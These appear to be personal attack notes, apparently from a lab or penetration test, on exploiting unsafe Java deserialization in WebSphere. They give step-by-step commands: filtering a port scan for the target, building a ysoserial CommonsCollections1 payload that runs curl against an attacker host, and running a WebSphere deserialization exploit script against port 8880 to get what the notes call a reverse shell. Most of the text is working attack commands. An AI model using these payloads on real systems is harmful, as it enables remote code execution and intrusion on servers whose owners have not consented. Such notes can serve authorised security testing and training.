Websphere Java Exploits :

1. identify vulnerabilties on a server
    grep -i 192.168.x.150 portscan_result_tcp_full.gnmap|tr "," "\n"
2. use ysoserial is a collection of utilities and property-oriented programming "gadget chains" discovered in common java libraries that can,
    under the right conditions, exploit Java applications performing unsafe deserialization of objects.
3. create 2 payloads to exploit the vulnerability
    3.1 Verifying the vulnerability
        3.1.1 Generate a test payload ( on kali machine )
            cd /root/Tools/deserialization-exploit/
            java -jar ysoserial-all.jar CommonsCollections1 'curl http://192.168.X.206:8000/testpayload.xml' > payload_test

    3.2 Execute the payload ( reserve shell on the target machine )
        sh websphere-2015-deserialization-exploit.sh https://192.168.x.150:8880/ payload_test
